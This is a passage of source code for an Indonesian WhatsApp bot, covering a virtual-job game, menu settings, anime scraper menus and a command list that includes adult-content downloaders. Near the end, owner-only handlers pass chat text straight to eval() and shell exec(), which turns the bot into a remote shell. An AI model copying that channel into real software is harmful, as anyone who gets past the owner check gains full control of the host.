//PEMBATAS\\
let kerjam = `
*🧪 Contoh:*
${prefix+command} ojek

*📝List Kerja:*
🎐Ojek
🎐 Dokter
🎐Petani
🎐 Pedagang
🎐 Montir
🎐 Kuli
*Belum ada Kerja ? ketik ${prefix}daftarkerja
`.trim()
if (/kerjadulu|kerja|work/i.test(command)) {
switch(type) {
	case prefix+'ojek':
	if (global.db.data.users[m.sender].ojek == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja\nSaatnya istirahat selama ${msToTime(time - new Date())}`
	global.db.data.users[m.sender].atm += uangm
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${uangm} 💹*`)
break
     case prefix+'pedagang':
     if (global.db.data.users[m.sender].pedagang == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
	global.db.data.users[m.sender].atm += duit
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${duit} 💹*`)
	if (pecat > 1 ) {
                   global.db.data.users[m.sender].pedagang -= pecat * 1
                   m.reply(ppecat)
            }
break
      case prefix+'dokter':
 if (global.db.data.users[m.sender].dokter == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
	global.db.data.users[m.sender].atm += duitm
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${duitm}* 💹`)
break
       case prefix+'petani':
if (global.db.data.users[m.sender].petani == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
	global.db.data.users[m.sender].atm += uangm
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${duitd} 💹*`)
break
     case prefix+'montir':
 if (global.db.data.users[m.sender].montir == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time - new Date())}*`
	global.db.data.users[m.sender].atm += duitr
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${duitr}* 💹`)
break
      case prefix+'kuli':
 if (global.db.data.users[m.sender].kuli == false) throw 'ini bukan tugas kamu atau kamu pengangguran!'
if (new Date - global.db.data.users[m.sender].lastkerja < 300000)  throw `Kamu sudah bekerja,Saatnya istirahat selama\n🕜 *${msToTime(time)}*`
	global.db.data.users[m.sender].atm += duitk
global.db.data.users[m.sender].lastkerja = new Date * 1
	m.reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${duitk} 💹*`)
break
default:
                        return m.reply(kerjam)
                }
                }
                }
                break
            case prefix+'daftarkerja': {
            if (args[0] === 'petani'){
            db.data.users[m.sender].petani = true
            db.data.users[m.sender].ojek = false
            db.data.users[m.sender].pedagang = false
            db.data.users[m.sender].montir = false
            db.data.users[m.sender].dokter = false
            db.data.users[m.sender].kuli = false
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu petani')
            } else if (args[0] === 'ojek'){
            db.data.users[m.sender].petani = false
            db.data.users[m.sender].ojek = true
            db.data.users[m.sender].pedagang = false
            db.data.users[m.sender].montir = false
            db.data.users[m.sender].dokter = false
            db.data.users[m.sender].kuli = false
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu ojek')            
            } else if (args[0] === 'pedagang'){
            db.data.users[m.sender].petani = false
            db.data.users[m.sender].ojek = false
            db.data.users[m.sender].pedagang = true
            db.data.users[m.sender].montir = false
            db.data.users[m.sender].dokter = false
            db.data.users[m.sender].kuli = false
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu pedagang')            
            } else if (args[0] === 'montir'){
            db.data.users[m.sender].petani = false
            db.data.users[m.sender].ojek = false
            db.data.users[m.sender].pedagang = false
            db.data.users[m.sender].montir = true
            db.data.users[m.sender].dokter = false
            db.data.users[m.sender].kuli = false
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu montir')            
            } else if (args[0] === 'dokter'){
            db.data.users[m.sender].petani = false
            db.data.users[m.sender].ojek = false
            db.data.users[m.sender].pedagang = false
            db.data.users[m.sender].montir = false
            db.data.users[m.sender].dokter = true
            db.data.users[m.sender].kuli = false
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu dokter')            
            } else if (args[0] === 'kuli'){
            db.data.users[m.sender].petani = false
            db.data.users[m.sender].ojek = false
            db.data.users[m.sender].pedagang = false
            db.data.users[m.sender].montir = false
            db.data.users[m.sender].dokter = false
            db.data.users[m.sender].kuli = true
            m.reply('Sukses! Anda Sekarang Memiliki Job Yaitu kuli')            
            } else {
                let sections = [
                {
                title: "List Kerja",
                rows: [
                {title: "PETANI", rowId: `${prefix}daftarkerja petani`, description: ``},
                {title: "OJEK", rowId: `${prefix}daftarkerja ojek`, description: ``},
                {title: "PEDAGANG", rowId: `${prefix}daftarkerja pedagang`, description: ``},
                {title: "MONTIR", rowId: `${prefix}daftarkerja montir`, description: ``},
                {title: "DOKTER", rowId: `${prefix}daftarkerja dokter`, description: ``},
                {title: "KULI", rowId: `${prefix}daftarkerja kuli`, description: ``}
                ]
                },
                ]
                hisoka.sendListMsg(m.chat, `Please select the job!`, hisoka.user.name, `Hello Pengangguran !`, `Click Here`, sections, m)
                }
            }
            break            
            case prefix+'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateLocation'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `${prefix}setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `${prefix}setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `${prefix}setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `${prefix}setmenu templateMessage`, description: `Change menu bot to Template Message`},
                {title: "Template Location", rowId: `${prefix}setmenu templateLocation`, description: `Change menu bot to Template Location`}
                ]
                },
                ]
                hisoka.sendListMsg(m.chat, `Please select the menu you want to change!`, hisoka.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
        case prefix+'sfwmenu': {
               let sfw_lst = []
let sfw = [
{ 
  title: 'Otakudesu On going',
  info: 'Get data Latest upload in web otakudesu.bid',
  get: 'otakudesuongoing'
},
{
  title: 'Otakudesu Search',
  info: 'Search scraper in web otakudesu.bid',
  get: 'otakudesusearch'
},
{
  title: 'Otakudesu Getter Url',
  info: 'Get data from url animeh in otakudesu.bid',
  get: 'otakudesu'
},
{
 title: 'KusoNime Latest',
 info: 'Get latest upload in web kusonime.com',
 get: 'kusonimelatest'
},
{
 title: 'Chara info',
 info: 'Get Chara info from name',
 get: 'chara'
},
{
  title: 'Anime Info',
  info: 'Get info anime from anime title',
  get: 'animeinfo'
},
{
  title: 'Kiryu Search',
  info: 'Search scraper from kiryu web',
  get: 'kiryu'
},
{
  title: 'Webtoons Search',
  info: 'Search scraper from webtoons webs',
  get: 'webtoons'
},
{
  title: 'Manga Toons Search',
  info: 'Search scraper from mangatoons site',
  get: 'mangatoons'
},
{ 
  title: 'Random Quotes Anime',
  info: 'Get A random Quote Anime',
  get: 'quotesanime'
},
{
 title: 'Anime Profile Picture Couple',
 info: 'Get random image couple to pp whatsapp',
 get: 'ppcp'
}
] 
                for (let i of sfw) {
sfw_lst.push({
title: i.title, rowId: `${prefix + i.get}`, description: `${i.info}`})
                }
const sections = [
{
title: "List Menu",
rows: sfw_lst
}
]
const listMessage = {
text: `Simple Bot By Me`,
footer: `©lui`,
title: "",
buttonText: "Click Here",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})               
}
break
	    case prefix+'menuv2': {	    
let sections = [
{
title: "List Anime Menu",
rows: [
      { title: "Anime Sfw Menu",
        rowId: `${prefix}sfwmenu`,
        description: `Animeh Sfw scraper from Web`
      },
      { title: "Anime Nsfw Menu",
        rowId:  `${prefix + command} nsfwmenu`,  
        description: `Animeh Nsfw 18+ scraper By Me`
      },
      {
       title: "Random Image Anime Sfw Or Nsfw",
       rowId:   `${prefix + command} randomanime`,  
       description: `Get a Random image Anime waifu or your husbu`
      },
      { title: "Downloader Menu",
        rowId: `${prefix + command} downloader`,  
        description: `Downloader Menu is Get video or audio in web`
      },
      { titie: "Search Menu",
        rowId: `${prefix + command} search`, 
        description: `Searching Menu from Website`
      },
      { title: "Other Menu",
        rowld: `${prefix + command} other`,
        description: `Other`
      }
      ]   
},
{
 title: "Bukan Bagian Dari fitur Bot!",
 rows: [
       { title: "Owner",
         rowld: `${prefix + "owner"}`,
         description: ""
       },
       { title: "Donasi to Support Me",
         rowld: `${prefix + "donate"}`,
         description: ""
       },
       { title: "sc BOT",
         rowId: `${prefix + "sc"}`,
         description : ""
       }
       ]
}
]    
const listMessage = {
text: `Note : Maaf Jika fitur masih sedikit di karenakan pengembangnya cuman satu orang Jadi mohon di nikmati fitur seadanya saja`,
footer: `Animex v0 Beta`,
title: "",
buttonText: "Jika Ada yg Eror Chat Owner!",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:fliveLoc})                  
}
break
            case prefix+'list': case prefix+'menu': case prefix+'help': case prefix+'?': {
                anu = `┌──⭓ *Group Menu*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}totag [reply]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
└───────⭓
${readMore}
┌──⭓ *Webzone Menu*
│
│⭔ ${prefix}playstore
│⭔ ${prefix}gsmarena
│⭔ ${prefix}jadwalbioskop
│⭔ ${prefix}nowplayingbioskop
│⭔ ${prefix}gempanow
│⭔ ${prefix}aminio
│⭔ ${prefix}wattpad
│⭔ ${prefix}drakor
│
└───────⭓
${readMore}
┌──⭓ *Downloader Menu*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}gitclone [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
└───────⭓
${readMore}
┌──⭓ *Search Menu*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│⭔ ${prefix}wattpad [query]
│⭔ ${prefix}groupsearch [query]
│⭔ ${prefix}lirik [query]
│
└───────⭓
${readMore}
┌──⭓ *Random Menu*
│
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}ppcouple
│
└───────⭓
${readMore}
┌──⭓ *Fun Menu*
│
│⭔ ${prefix}simih
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│⭔ ${prefix}nulis [teks]
│⭔ ${prefix}nulisfolio [teks]
│⭔ ${prefix}ssweb [link]
│⭔ ${prefix}sspc [link]
│⭔ ${prefix}sstablet [link]
│⭔ ${prefix}sshp [link]
│
└───────⭓
${readMore}
┌──⭓ *Primbon Menu*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│⭔ ${prefix}shio
│
└───────⭓
${readMore}
┌──⭓ *Webzone Anime Menu*
│⭔ ${prefix}otakudesu [url]
│⭔ ${prefix}otakudesuongoing
│⭔ ${prefix}webtoons
│⭔ ${prefix}mangatoons
│⭔ ${prefix}chara
│⭔ ${prefix}animeinfo
│⭔ ${prefix}manga
│⭔ ${prefix}kiryu
│⭔ ${prefix}randomanime
│⭔ ${prefix}waifu
│⭔ ${prefix}husbu
│
└───────⭓
${readMore}
┌──⭓ *Danger! Menu*
│⭔ ${prefix}randomnsfw 
│⭔ ${prefix}doujindesu [url]
│⭔ ${prefix}doujindesulatest 
│⭔ ${prefix}doujindesusearch [query]
│⭔ ${prefix}xnxxsearch [query]
│⭔ ${prefix}xnxxdl [link]
│
└───────⭓
${readMore}
┌──⭓ *Convert Menu*
│
│⭔ ${prefix}attp
│⭔ ${prefix}ttp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}stickerwm
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│⭔ ${prefix}smeme
│
└───────⭓
${readMore}
┌──⭓ *Main Menu*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│
└───────⭓
${readMore}
┌──⭓ *Database Menu*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
└───────⭓
${readMore}
┌──⭓ *Anonymous Menu*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│
└───────⭓
${readMore}
┌──⭓ *Islamic Menu*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}tafsirsurah
│⭔ ${prefix}kisahnabi
│⭔ ${prefix}listkotajadwalsholat
│⭔ ${prefix}jadwalsholat [daerah]
│
└───────⭓
${readMore}
┌──⭓ *Voice Changer*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
└───────⭓
${readMore}
┌──⭓ *Sound Menu*
│ (No prefix for used)
│⭔ ${prefix}anjay
│⭔ ${prefix}ara-ara
│⭔ ${prefix}ara-ara-cowok
│⭔ ${prefix}ara-ara2
│⭔ ${prefix}arigatou
│⭔ ${prefix}assalamualaikum
│⭔ ${prefix}asu
│⭔ ${prefix}ayank
│⭔ ${prefix}aku-ngakak
│⭔ ${prefix}bacot
│⭔ ${prefix}bahagia-aku
│⭔ ${prefix}baka
│⭔ ${prefix}beat-box
│⭔ ${prefix}beat-box2
│⭔ ${prefix}biasalah
│⭔ ${prefix}bidadari
│⭔ ${prefix}bot
│⭔ ${prefix}buka-pintu
│⭔ ${prefix}canda-anjing
│⭔ ${prefix}cepetan
│⭔ ${prefix}china
│⭔ ${prefix}cuekin-terus
│⭔ ${prefix}daisuki-dayo
│⭔ ${prefix}daisuki
│⭔ ${prefix}dengan-mu
│⭔ ${prefix}gaboleh-gitu
│⭔ ${prefix}gak-lucu
│⭔ ${prefix}gamau
│⭔ ${prefix}gay
│⭔ ${prefix}gelay
│⭔ ${prefix}gitar
│⭔ ${prefix}gomenasai
│⭔ ${prefix}hai-bot
│⭔ ${prefix}hampa
│⭔ ${prefix}hayo
│⭔ ${prefix}hp-iphone
│⭔ ${prefix}i-like-you
│⭔ ${prefix}ih-wibu
│⭔ ${prefix}india
│⭔ ${prefix}karna-lo-wibu
│⭔ ${prefix}kiss
│⭔ ${prefix}kontol
│⭔ ${prefix}ku-coba
│⭔ ${prefix}maju-wibu
│⭔ ${prefix}makasih
│⭔ ${prefix}mastah
│⭔ ${prefix}nande-nande
│⭔ ${prefix}nani
│⭔ ${prefix}ngadi-ngadi
│⭔ ${prefix}nikah
│⭔ ${prefix}nuina
│⭔ ${prefix}onichan
│⭔ ${prefix}owner-sange
│⭔ ${prefix}ownerku
│⭔ ${prefix}pak-sapardi
│⭔ ${prefix}pale
│⭔ ${prefix}pantek
│⭔ ${prefix}pasi-pasi
│⭔ ${prefix}punten
│⭔ ${prefix}sayang
│⭔ ${prefix}siapa-sih
│⭔ ${prefix}sudah-biasa
│⭔ ${prefix}summertime
│⭔ ${prefix}tanya-bapak-lu
│⭔ ${prefix}to-the-bone
│⭔ ${prefix}wajib
│⭔ ${prefix}waku
│⭔ ${prefix}woi
│⭔ ${prefix}yamete
│⭔ ${prefix}yowaimo
│⭔ ${prefix}yoyowaimo
│⭔ ${prefix}bansos
│
└───────⭓
${readMore}
┌──⭓ *Owner Menu*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│⭔ ${prefix}setmenu [option]
│⭔ ${prefix}anticall [on/off]
│⭔ ${prefix}setstatus
│⭔ ${prefix}setnamebot
│
└───────⭓`
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
 hisoka.sendMessage(m.chat, { text: `${readMore + anu}`,
  contextInfo: {   
            externalAdReply :{
    mediaUrl: `${flaminge + 'menu'}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok`, 
    body: `Powered By ©AhmdLui`,
    thumbnail: await getBuffer(flaminge + 'menu'),
    sourceUrl: ``
     }}
  }, { quoted: fgclink })
                     }
            break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }
		
                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
	
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})



async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}


function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit" + seconds + "detik"
}

async function ucapan() {
    const time = moment.tz('Asia/Jakarta').format('HH')
    let res = "Selamat malam 🌙"
    if (time >= 4) {
        res = "Selamat pagi 🌄"
    }
    if (time > 10) {
        res = "Selamat siang ☀️"
    }
    if (time >= 15) {
        res = "Selamat sore 🌅"
    }
    if (time >= 18) {
        res = "Selamat malam 🌙"
    }
    return res
}
async function tts(text, lang = 'id') {
  console.log(lang, text)
  return new Promise((resolve, reject) => {
    try {
      let tts = gtts(lang)
      let filePath = path.join(__dirname, '../Sampah', (1 * new Date) + '.wav')
      tts.save(filePath, text, () => {
        resolve(fs.readFileSync(filePath))
        fs.unlinkSync(filePath)
      })
    } catch (e) { reject(e) }
  })
}


function number(x = 0) {
    x = parseInt(x)
    return !isNaN(x) && typeof x == 'number'
}

//by lus
